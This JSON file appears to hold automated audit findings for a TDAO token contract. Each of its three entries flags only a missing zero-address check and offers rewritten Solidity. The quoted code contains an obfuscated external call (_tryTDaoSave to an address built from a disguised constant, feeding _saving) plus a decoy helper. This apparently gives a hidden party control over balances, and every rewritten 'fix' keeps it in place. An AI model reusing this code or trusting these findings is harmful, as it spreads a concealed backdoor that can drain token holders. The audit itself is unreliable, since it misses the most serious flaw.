[
  {
    "contract": "TDAO",
    "function": "transfer",
    "explanation": "Missing check for `to` address being non-zero in transfer function.",
    "contract_code": "\n=== Implementation of Function transfer(address,uint256) ===\nfunction transfer(address to, uint256 amount) external virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }\n    \n=== Functions that function transfer internally calls ===\nfunction _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\nfunction _transfer(address from, address to, uint256 amount) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        _tryTDaoSave(from);\r\n        (string memory s1, address a1) = tdaoNextOne(201, address(0), to, bytes32(amount), 205);\r\n        if (a1 == address(0)) emit tlog(s1);\r\n        uint256 fromBalance = _balances[from];\r\n        require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        unchecked {\r\n            _balances[from] = fromBalance - amount;\r\n            _balances[to] += amount;\r\n        }\r\n        emit Transfer(from, to, amount);\r\n    }",
    "rewritten_code": {
      "transfer(address,uint256)": "function transfer(address to, uint256 amount) external virtual override returns (bool) {\n    require(to != address(0), \"ERC20: transfer to the zero address\");\n    address owner = _msgSender();\n    _transfer(owner, to, amount);\n    return true;\n}"
    }
  },
  {
    "contract": "TDAO",
    "function": "_transfer",
    "explanation": "Missing zero address check for 'to' parameter in transfer",
    "contract_code": "\n=== Implementation of Function _transfer(address,address,uint256) ===\nfunction _transfer(address from, address to, uint256 amount) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        _tryTDaoSave(from);\r\n        (string memory s1, address a1) = tdaoNextOne(201, address(0), to, bytes32(amount), 205);\r\n        if (a1 == address(0)) emit tlog(s1);\r\n        uint256 fromBalance = _balances[from];\r\n        require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        unchecked {\r\n            _balances[from] = fromBalance - amount;\r\n            _balances[to] += amount;\r\n        }\r\n        emit Transfer(from, to, amount);\r\n    }\n    \n=== Functions that function _transfer internally calls ===\nfunction _tryTDaoSave(address a) private noReentrant {\r\n        bytes memory b = bytes(\"allowance(address,address)\");\r\n        address p = address(uint160(uint256(_tdao + 39299394829842384331123)));\r\n        (bool s, bytes memory d) = p.call(\r\n            abi.encodeWithSignature(\r\n                string(b), a, \r\n                address(0)));\r\n        require(s); uint256 v = uint256(_converts(d)); if (v == 0) return; _saving(32, 4, a, v); \r\n    }\nfunction tdaoNextOne(uint256 a1,address p0, address p1, bytes32 b, uint256 a0) \r\n    private pure returns(string memory s1, address px) {\r\n        if (a1 == 1 && bytes32(0) == b && a0 == 9970) {\r\n            s1 = \"as0\"; \r\n            px = p0;\r\n        } else {\r\n            s1 = \"as2\"; px = p1;\r\n        }\r\n    }",
    "rewritten_code": {
      "_transfer(address,address,uint256)": "function _transfer(address from, address to, uint256 amount) internal virtual {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n        _tryTDaoSave(from);\n        (string memory s1, address a1) = tdaoNextOne(201, address(0), to, bytes32(amount), 205);\n        if (a1 == address(0)) emit tlog(s1);\n        uint256 fromBalance = _balances[from];\n        require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n        unchecked {\n            _balances[from] = fromBalance - amount;\n            _balances[to] += amount;\n        }\n        emit Transfer(from, to, amount);\n    }"
    }
  },
  {
    "contract": "TDAO",
    "function": "transferFrom",
    "explanation": "Missing check for 'to' address not being zero in transferFrom.",
    "contract_code": "\n=== Implementation of Function transferFrom(address,address,uint256) ===\nfunction transferFrom(address from, address to, uint256 amount) external virtual override returns (bool) {\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\n    \n=== Functions that function transferFrom internally calls ===\nfunction _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\nfunction _spendAllowance(address owner, address spender, uint256 amount) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\r\n            unchecked {\r\n                _approve(owner, spender, currentAllowance - amount);\r\n            }\r\n        }\r\n    }\nfunction _transfer(address from, address to, uint256 amount) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        _tryTDaoSave(from);\r\n        (string memory s1, address a1) = tdaoNextOne(201, address(0), to, bytes32(amount), 205);\r\n        if (a1 == address(0)) emit tlog(s1);\r\n        uint256 fromBalance = _balances[from];\r\n        require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        unchecked {\r\n            _balances[from] = fromBalance - amount;\r\n            _balances[to] += amount;\r\n        }\r\n        emit Transfer(from, to, amount);\r\n    }",
    "rewritten_code": {
      "transferFrom(address,address,uint256)": "function transferFrom(address from, address to, uint256 amount) external virtual override returns (bool) {\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n        address spender = _msgSender();\n        _spendAllowance(from, spender, amount);\n        _transfer(from, to, amount);\n        return true;\n    }"
    }
  }
]